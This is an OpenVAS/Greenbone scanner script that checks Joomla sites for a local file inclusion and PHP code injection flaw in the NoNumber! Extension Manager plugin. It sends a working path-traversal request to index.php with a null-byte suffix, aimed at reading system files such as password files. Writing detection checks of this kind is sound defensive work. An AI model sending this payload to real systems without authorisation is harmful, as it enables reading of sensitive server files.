CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103308" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)" );
	script_bugtraq_id( 50191 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Joomla NoNumber! Extension Manager Plugin Local File Include and PHP code Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50191" );
	script_xref( name: "URL", value: "http://www.nonumber.nl/extensions/nonumbermanager" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "joomla_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "solution", value: "Reports indicate vendor updates are available. Please contact the vendor for
more information." );
	script_tag( name: "summary", value: "NoNumber! Extension Manager is prone to multiple input-validation
vulnerabilities because it fails to properly sanitize user-supplied input.

An attacker can exploit these issues to inject arbitrary PHP code and include and execute arbitrary files from the
vulnerable system in the context of the affected application. Other attacks are also possible." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?nn_qp=1&file=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00.inc.php";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

